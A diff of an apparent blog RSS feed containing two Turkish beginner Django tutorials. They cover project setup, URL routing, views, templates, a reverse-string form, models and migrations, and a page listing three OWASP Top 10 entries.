+      </item>
+    
+      <item>
+        <title>Django Giriş [ 2 ]</title>
+        <description>&lt;center&gt;&lt;h3&gt;Django'da Modeller&lt;/h3&gt;&lt;/center&gt;
+
+&lt;p&gt;      Django’da modeller, verilerin kaynağıdır. Burada verilerin özellikleri tutulur ve onlara işaret edilir. Her bir veri tablosu için ayrı bir class tanımlanır. Tabloya ait üyeler ilgili class’ın içerisinde yer alır. Django’da bir model class’ı oluşturduktan sonra buraya dışarıdan erişebilmemiz için bir API sağlanır. Bu API ile veritabanı sorgularımızı kullanabiliriz. Bir önceki yazıda oluşturduğumuz uygulama üzerinde &lt;code class=&quot;highlighter-rouge&quot;&gt;practice/settings.py&lt;/code&gt; dosyasına giderek varsayılan veritabanı bilgisini görebilirsiniz. Aşağıdaki gibi bir çıktı olacaktır. Django default olarak sqlite3 veritabanını kullanır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/settings.py
+DATABASES = {
+    'default': {
+	'ENGINE': 'django.db.backends.sqlite3',
+	'NAME': os.path.join(BASE_DIR, 'db.sqlite3'),
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Model Oluşturma&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Bir önceki yazıda oluşturduğumuz projenin üzerine yeni bir uygulama oluşturalım ve modeller üzerinde temel işlemler gerçekleştirelim. Aynı zamanda bu uygulama için kendine ait bir yol belirtelim. Bir önceki projede uygulama kök dizin üzerinden hizmet veriyordu. Bu uygulama için kendine ait bir &lt;code class=&quot;highlighter-rouge&quot;&gt;urls.py&lt;/code&gt; dosyası oluşturalım ve farklı bir dizin üzerinden hizmet vermesini sağlayalım. Öncelikle aşağıdaki gibi yeni uygulamamızı oluşturuyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 manage.py startapp databaseOperations
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Yeni uygulamamızı da &lt;code class=&quot;highlighter-rouge&quot;&gt;practice/settings.py&lt;/code&gt; dosyasına aşağıdaki gibi bildirmemiz gerekiyor.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/settings.py
+INSTALLED_APPS = [
+    'django.contrib.admin',
+    'django.contrib.auth',
+    'django.contrib.contenttypes',
+    'django.contrib.sessions',
+    'django.contrib.messages',
+    'django.contrib.staticfiles',
+    'reverseString',
+    'databaseOperations',
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Şimdi yeni uygulamamız için bir &lt;code class=&quot;highlighter-rouge&quot;&gt;urls.py&lt;/code&gt; dosyası tanımlayalım. Bu dosya varsayılan olarak gelmeyecektir. Kendimiz oluşturmamız gerekiyor.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;touch databaseOperations/urls.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu işlemi gerçekleştirmek bir dizi operasyon gerektiriyor. Öncelikle yeni uygulamamızın içerisinde oluşturduğumuz &lt;code class=&quot;highlighter-rouge&quot;&gt;databaseOperations/urls.py&lt;/code&gt; aşağıdaki gibi düzenleyeceğiz. Bu sayede tarayıcı üzerinde &lt;code class=&quot;highlighter-rouge&quot;&gt;/databaseOperations&lt;/code&gt; sorgusu yapıldığında hangi fonksiyonun çalışacağı belirlenecek.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#databaseOperations/urls.py
+from django.contrib import admin
+from django.conf.urls import url
+from databaseOperations.views import *
+
+urlpatterns = [
+    url(r'^$', databaseOperationsHomepage),
+
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Şimdi de &lt;code class=&quot;highlighter-rouge&quot;&gt;databaseOperations/views.py&lt;/code&gt; üzerinde ilgili metodun ne işlem yapacağını tanımlayacağız. URL dosyasında karşılığı bulunan fonksiyonu views bölümüne gelip ne yapması gerektiğini arayacak.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#databaseOperations/views.py
+from django.shortcuts import render,HttpResponse
+
+def databaseOperationsHomepage(request):
+    return HttpResponse('Database Operations Homepage')
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Son olarak &lt;code class=&quot;highlighter-rouge&quot;&gt;practice/urls.py&lt;/code&gt; dosyasına yeni uygulamamızdaki url’leri eklememiz gerekiyor. Çünkü sorgu kök dizinden başlayacağı için önce buradan nereye bakılması gerektiğine karar verilecek.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/urls.py
+from django.contrib import admin
+from django.conf.urls import url, include
+from reverseString.views import *
+from databaseOperations.views import *
+
+urlpatterns = [
+    url('admin/', admin.site.urls),
+    url(r'^$', homepage),
+    url(r'^get_string/$', get_string),
+
+    url(r'^databaseOperations/', include('databaseOperations.urls')),
+
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu işlemlerin ardından tarayıcıdan &lt;code class=&quot;highlighter-rouge&quot;&gt;127.0.0.1:8000/databaseOperations&lt;/code&gt; sayfasına gildiğinde &lt;code class=&quot;highlighter-rouge&quot;&gt;Database Operations Homepage&lt;/code&gt; mesajı alınacaktır.&lt;/p&gt;
+
+&lt;p&gt;      Şimdi &lt;code class=&quot;highlighter-rouge&quot;&gt;databaseOperations/models.py&lt;/code&gt; dosyasına giderek ilk model sınıfımızı oluşturalım. Burada her sınıf bir tabloya işaret ediyor.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#databaseOperations/models.py
+from django.db import models
+
+class OwaspTopTen(models.Model):
+    number = models.IntegerField(max_length=20)
+    vulnerability_name = models.TextField(max_length=50)
+    vulnerability_description = models.TextField(max_length=200)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Değişikliklerin kayıt edilmesi ve model sınıfının oluşturulması için aşağıdaki adımları izliyoruz. Migration, Django’da modeller ile ilgili yaptığımız değişiklikleri duyurma yöntemidir. Migration işlemlerini uygulamak veya kaldırmak için &lt;code class=&quot;highlighter-rouge&quot;&gt;migrate&lt;/code&gt;, yeni migration oluşturmak için de &lt;code class=&quot;highlighter-rouge&quot;&gt;makemigration&lt;/code&gt; parametresini kullanırız.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 manage.py makemigrations
+python3 manage.py migrate
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Database API&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;       Şimdi API üzerinden tablomuza bilgiler ekleyelim ve bu bilgileri bir HTML sayfası oluşturarak görüntüleyelim. API’yi başlatmak ve veri eklemek için aşağıdaki işlemleri gerçekleştiriyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 manage.py shell
+
+&amp;gt;&amp;gt;&amp;gt;from databaseOperations.models import OwaspTopTen
+&amp;gt;&amp;gt;&amp;gt;OwaspTopTen.objects.create(number=1,vulnerability_name='Injection',vulnerability_description='Injection flaws, such as SQL, NoSQL, OS, and LDAP injection, occur when untrusted data is sent to an interpreter as part of a command or query.')
+&amp;gt;&amp;gt;&amp;gt;OwaspTopTen.objects.create(number=2,vulnerability_name='Broken Authentication',vulnerability_description='Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users identities temporarily or permanently.'
+&amp;gt;&amp;gt;&amp;gt;OwaspTopTen.objects.create(number=3,vulnerability_name='Sensitive Data Exposure',vulnerability_description='Many web applications and APIs do not properly protect sensitive data, such as financial, healthcare, and PII.')
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Database API üzerinden oluşturduğumuz bilgileri bir HTML sayfasına çağırıp listeleyim. Bunun için önce bir &lt;code class=&quot;highlighter-rouge&quot;&gt;databaseOperations&lt;/code&gt; dizini altına bir  &lt;code class=&quot;highlighter-rouge&quot;&gt;templates&lt;/code&gt; dizini oluşturacağız. Onun altına da anasayfamız olmasını istediğimiz bir görüntüleme sayfası oluşturacağız.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir databaseOperations/templates
+touch databaseOperations/templates/owasptop10.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Owasp Top 10 Uygulaması&lt;/h5&gt;&lt;/center&gt;
+
+&lt;p&gt;      Bunun yanı sıra &lt;code class=&quot;highlighter-rouge&quot;&gt;databaseOperations/views.py&lt;/code&gt; dosyasını da oluşturduğumuz HTML sayfasını çağıracağı şekilde aşağıdaki gibi düzenliyoruz. Bu adımdan sonra veritabanı sorguları ile tablomuzdaki değerleri aşağıdaki gibi çağıracağız ve HTML sayfasına göndereceğiz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#databaseOperations/views.py
+from django.shortcuts import render,HttpResponse
+from .models import OwaspTopTen
+
+def databaseOperationsHomepage(request):
+    data = OwaspTopTen.objects.all()
+    return render(request,'owasptop10.html',{'info': data})
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      &lt;code class=&quot;highlighter-rouge&quot;&gt;databaseOperations/templates/owasptop10.html&lt;/code&gt; sayfasını da aşağıdaki gibi düzenleyerek verileri buraya aktarıp görüntülüyoruz. Kodu çalıştırırken  &lt;code class=&quot;highlighter-rouge&quot;&gt;'&lt;/code&gt;
+ işaretini kaldırmayı unutmayın.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#databaseOperations/templates/owasptop10.html
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Owasp Top 10&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Owasp Top 10&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+{'% for vuln in info %} 
+{'{vuln.number}} : 
+{'{vuln.vulnerability_name}}
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;	
+{'{vuln.vulnerability_description}}
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+{'% endfor %}
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;	
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;br /&gt;
+&lt;img src=&quot;/img/django/django-owasp.png&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;h3&gt;Sonuç&lt;/h3&gt;&lt;/center&gt;
+&lt;p&gt;      Bu yazıda Django’da model oluşturup shell API ile bu model sınıflarına veri ekledik. Bunun yanı sıra template üzerine veri aktarımı gerçekleştirdik. Bir sonraki yazı da Django’da formlar ile ilgili işlemler üzerinde duracağız.&lt;/p&gt;
+
+</description>
+        <pubDate>Fri, 02 Feb 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/tr/2018/02/02/django-giris-2.html</link>
+        <guid isPermaLink="true">http://localhost:4000/tr/2018/02/02/django-giris-2.html</guid>
+        
+        
+        <category>tr</category>
+        
+      </item>
+    
+      <item>
+        <title>Django Giriş [ 1 ]</title>
+        <description>&lt;center&gt;&lt;h3&gt;Django Nedir ?&lt;/h3&gt;&lt;/center&gt;
+
+&lt;p&gt;      Django, Python ile yazılmış, ücretsiz ve açık kaynak kodlu web uygulama geliştirme ortamıdır. Uygulama geliştirmeyi hızlandırmak için gereken bazı ayarlamaları ve dosyaları sizin için otomatik hazır hale getirebilir. Aynı zamanda uygulamanızı ayaklandırmanız için apache, Ngnix gibi farklı bir web server kurmanıza gerek kalmadan, kendi sunucusu ile bu işlemleri gerçekleştirebilir.Bu ortam MVC (Model - View - Controller) yapısına oldukça benzeyen &lt;code class=&quot;highlighter-rouge&quot;&gt;MVT (Model - View - Template)&lt;/code&gt; mimarisi ile çalışmaktadır.&lt;/p&gt;
+
+&lt;center&gt;&lt;h5&gt;Model&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Burası, uygulamanın veri ile iletişimde bulunduğu bölümdür. Veritabanı,tablolar, sütunlar için bir temsilci diyebiliriz. Tam olarak veriler burada bulunur diyemesekte buradan temsil edildiğini söyleyebiliriz. Model dosyası içerisinde verilerimizin abstract halleri bulunur. Bu yüzden veritabanı kısmına karşılık gelen yer burasıdır.&lt;/p&gt;
+
+&lt;center&gt;&lt;h5&gt;View&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      View bölümü için yönetim kısmı diyebiliriz. Burada uygulamanın işlevlerini belirleyecek metodlar/fonksiyonlar yer alır. Modeller ve Template’ler arasında veriyi taşıyabilir ve kullanabilir. Uygulamayı tarayıcıdan çağıracağımız zaman, view kısmında karşılığı olan bir metod bulunmalıdır.Bu metod sayesinde yapılan çağrıya nasıl bir yanıt verileceği belirlenir. İstek yapılan sayfa tarayıcıya buradan gönderilir. Veritabanında yani model kısmında  bulunan veriler, buradaki metodlar ile alınıp istemci tarafına gönderilir.&lt;/p&gt;
+
+&lt;center&gt;&lt;h5&gt;Template&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Burası, uygulamanın sunumuyla ilgili yapıların bulunduğu bölümdür. İstemcinin göreceği, front-end işlemlerinin gerçekleştirildiği yerdir. HTML dosyalarımız burada bulunacaktır.&lt;/p&gt;
+
+&lt;center&gt;&lt;h3&gt;Proje ve Uygulama Oluşturma&lt;/h3&gt;&lt;/center&gt;
+&lt;center&gt;&lt;h5&gt;Proje Oluşturma&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Django-admin, django’nun temel operasyonel işlemlerini yürütmek için geliştirilmiş yardımcı komut satırı uygulamasıdır. Bu uyguluma ile projemizi aşağıdaki gibi oluşturuyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;django-admin startproject practice
+cd practice
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu işlemi yaptığımızda bu dizin içerisinde &lt;code class=&quot;highlighter-rouge&quot;&gt;manage.py&lt;/code&gt; isimli bir dosya ve &lt;code class=&quot;highlighter-rouge&quot;&gt;practice&lt;/code&gt; isimli bir dizin oluşur. manage.py dosyası çeşitli parametreler alarak sunucu başlatma, uygulama oluşturma, uygulama için ayarları tanımlama vb. gibi işlemleri yerine getirmemizi sağlar. Örnek dosya yapısı aşağıdaki gibi olacaktır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---practice
+   ---practice
+     ---__init__.py
+     ---settings.py
+     ---urls.py
+     ---wsgi.py
+   ---manage.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Projeyi ayaklandırmak için aşağıdaki gibi &lt;code class=&quot;highlighter-rouge&quot;&gt;manage.py&lt;/code&gt; dosyasını çalıştırmamız gerekiyor. Varsayılan olarak port numarası 8000 olarak belirlenmiştir. Aşağıdaki gibi başlatıldığında 8000 portu üzerinde çalışacaktır. Devamına eklediğiniz numaraya göre port değiştirilebilir.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 manage.py runserver
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Uygulama Oluşturma&lt;/h5&gt;&lt;/center&gt;
+&lt;p&gt;      Proje oluşturduğumuzda otomatik oluşan &lt;code class=&quot;highlighter-rouge&quot;&gt;manage.py&lt;/code&gt; dosyası django-admin gibi temel işlemlerimizi yerine getirmenin yanı sıra aşağıdaki gibi uygulama oluşturmamızı da sağlar.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 manage.py startapp reverseString
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu işlemden sonra dosya yapısı aşağıdaki hali almıştır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;---practice
+   ---practice
+     ---__init__.py
+     ---__pycache__
+     ---settings.py
+     ---urls.py
+     ---wsgi.py
+   ---manage.py
+   ---reverseString
+     ---admin.py
+     ---apps.py
+     ---__init__.py
+     ---migrations
+         ---__init__.py
+     ---models.py
+     ---tests.py
+     ---views.py
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Uygulama oluşturduktan sonra uygulamayı projeye bildirmemiz gerekiyor. Bunu &lt;code class=&quot;highlighter-rouge&quot;&gt;practice/settings.py&lt;/code&gt; dosyası üzerinde yapıyoruz. Burada hazır olarak yüklenmiş diğer uygulamalarda yer alıyor. Kendi uygulamamızın ismini de buraya ekliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/settings.py
+INSTALLED_APPS = [
+    'django.contrib.admin',
+    'django.contrib.auth',
+    'django.contrib.contenttypes',
+    'django.contrib.sessions',
+    'django.contrib.messages',
+    'django.contrib.staticfiles',
+    'reverseString',
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Uygulamamızı kök dizine getirmek için bazı işlemler yapmamız gerekiyor. View kısmında bahsettiğim gibi tarayıcıdan herhangi bir dizine gidilirken bir istek yapılmış olur. Bu isteğe karşılık gelen fonksiyon aranır ve içeriğinde yazan işlemler uygulanır. Django ortamında &lt;code class=&quot;highlighter-rouge&quot;&gt;urls.py&lt;/code&gt; dosyaları bulunur ve bu dosyalar bizim url’ler ile ilgili işlemlerimizi düzenler ve yönetir. Tarayıcıdan yazdığımız değer ilk önce buraya düşer. Burada karşılık gelen fonksiyon ismini bulur. O ismi view bölümünde arar ve gereken işlemleri gerçekleştirir. İlk düzenleyeceğimiz dosya &lt;code class=&quot;highlighter-rouge&quot;&gt;practice/urls.py&lt;/code&gt; dosyasıdır. Burada &lt;code class=&quot;highlighter-rouge&quot;&gt;/admin&lt;/code&gt; sayfası için daha önceden tanımlanmış bir ifade bulunmaktadır. Bunun yanına &lt;code class=&quot;highlighter-rouge&quot;&gt;kök(/)&lt;/code&gt; dizin için kendi sayfamızı ekliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/urls.py
+from django.contrib import admin
+from django.conf.urls import url, include
+from reverseString.views import *
+
+urlpatterns = [
+    url('admin/', admin.site.urls),
+    url(r'^$', homepage),
+
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu ekleme işleminin ardından, tarayıcıdan kök dizin isteği yapıldığında &lt;code class=&quot;highlighter-rouge&quot;&gt;homepage&lt;/code&gt; adlı fonksiyon aranacaktır. Bu fonksiyonu &lt;code class=&quot;highlighter-rouge&quot;&gt;reverseString/views.py&lt;/code&gt; dosyasına ekleyeceğiz. Yukarıda görüldüğü &lt;code class=&quot;highlighter-rouge&quot;&gt;from reverseString.views import *&lt;/code&gt; yazarak oradaki tüm fonksiyonları buraya import ettik. Şimdi &lt;code class=&quot;highlighter-rouge&quot;&gt;reverseString/views.py&lt;/code&gt; dosyasını aşağıdaki gibi düzenliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#reverseString/views.py
+from django.shortcuts import render,HttpResponse
+
+def homepage(request):
+    return HttpResponse('Hello from Homepage')
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu işlemin ardından sunucuyu tekrar çalıştırdığımızda ve kök dizine gittiğimizde &lt;code class=&quot;highlighter-rouge&quot;&gt;Hello from Homepage&lt;/code&gt; mesajı ile karşılaşacağız. Şimdi bir HTML sayfası oluşturalım ve &lt;code class=&quot;highlighter-rouge&quot;&gt;render()&lt;/code&gt; fonksiyonu ile istemci tarafına oluşturduğumuz bu sayfayı getirelim. Öncelikle &lt;code class=&quot;highlighter-rouge&quot;&gt;reverseString&lt;/code&gt; dizini altına &lt;code class=&quot;highlighter-rouge&quot;&gt;templates&lt;/code&gt; adlı bir dizin oluşturalım. Buranın altına da HTML sayfamızı ekleyelim.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir reverseString/templates
+touch reverseString/templates/home.html
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Oluşturduğumuz templates dizini için yol bildirmemiz gerekiyor. Bunun için &lt;code class=&quot;highlighter-rouge&quot;&gt;practice/settings.py&lt;/code&gt; dosyasına gidiyoruz. Dosyayı aşağıdaki gibi düzenledikten sonra templates dizinimiz ulaşılabilir durumda olacaktır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#practice/settings.py
+TEMPLATES = [
+    {
+	'BACKEND': 'django.template.backends.django.DjangoTemplates',
+	'DIRS': [os.path.join(BASE_DIR,'templates')],
+	'APP_DIRS': True,
+	'OPTIONS': {
+	    'context_processors': [
+	        'django.template.context_processors.debug',
+	        'django.template.context_processors.request',
+	        'django.contrib.auth.context_processors.auth',
+	        'django.contrib.messages.context_processors.messages',
+	    ],
+	},
+    },
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;      Bu işlemi tamamladıktan sonra &lt;code class=&quot;highlighter-rouge&quot;&gt;reverseString/views.py&lt;/code&gt; dosyasına gelip aşağıdaki gibi düzenleyebiliriz. Sunucuyu başlatıp tarayıcıdan tekrar kök dizine gittiğimizde &lt;code class=&quot;highlighter-rouge&quot;&gt;home.html&lt;/code&gt; sayfası ile karşılaşacağız.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#reverseString/views.py
+from django.shortcuts import render,HttpResponse
+
+def homepage(request):
+    return render(request,'home.html')
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;center&gt;&lt;h5&gt;Reverse String Uygulaması&lt;/h5&gt;&lt;/center&gt;
+
+&lt;p&gt;      Yazıyı basit bir uygulama ile sonlandırmak istiyorum. Anasayfa üzerinde input alıp , aldığı inputu tersten yazan basit bir uygulama yazalım.&lt;/p&gt;
+
+&lt;p&gt;      Kullanıcı kısmı için &lt;code class=&quot;highlighter-rouge&quot;&gt;reverseString/templates/home.html&lt;/code&gt; dosyasını aşağıdaki gibi düzenliyoruz.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#reverseString/templates/home.html
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Reverse String Application&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Reverse String Application&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/get_string/&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	String    : &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mystring&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Send&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
